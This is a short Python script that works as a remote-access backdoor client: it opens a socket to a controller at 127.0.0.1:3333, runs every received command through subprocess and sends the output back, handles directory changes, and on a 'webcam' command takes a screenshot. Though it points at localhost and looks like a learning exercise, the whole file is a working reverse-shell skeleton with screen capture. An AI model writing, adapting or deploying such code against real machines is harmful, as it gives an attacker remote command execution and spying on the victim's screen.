import os
import socket
import pyautogui
import subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
addr = ('127.0.0.1', 3333)
sock.connect(addr)
flag = "200"

def snapshot():
    screens = pyautogui.screenshot()
    snapname = "name.png"
    screens.save(snapname)
    sock.send((flag + snapname).encode())

def command(x):
    cmmd = x.split()
    if cmmd[0] == "cd":
        os.chdir(cmmd[1])
        sock.send(flag.encode())
    else:
        output = subprocess.getoutput(cmmd)
        if output == "":
            sock.send(flag.encode())
        else:
            sock.send(output.encode())

while True:
    resp = sock.recv(1024).decode()
    print("Received:", resp)

    match resp:
        case "webcam":
            snapshot()
        case _:
            command(resp)
